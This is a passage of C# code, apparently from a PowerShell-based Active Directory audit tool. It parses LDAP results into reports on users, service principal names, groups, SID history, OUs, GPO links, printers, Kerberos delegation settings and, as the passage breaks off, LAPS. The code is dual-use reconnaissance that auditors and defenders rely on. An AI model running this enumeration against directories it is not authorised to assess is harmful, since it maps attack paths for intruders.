                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? AdUser.Properties["canonicalname"][0] : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    String Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    String Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    String PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (String Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (String SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        String[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Properties["name"][0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Properties["samaccountname"][0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    String ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    String ManagedBy = "";
                    String GroupCategory = null;
                    String GroupScope = null;
                    String SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(',')[0]).Split('=')[1];
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        // TO DO
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    String gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    String GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (String link in GPLinks)
                    {
                        String[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    String StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    String OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? AdComputer.Properties["name"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? AdComputer.Properties["samaccountname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? AdComputer.Properties["Description"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (String SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        String[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (String) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = String.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Properties["name"][0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
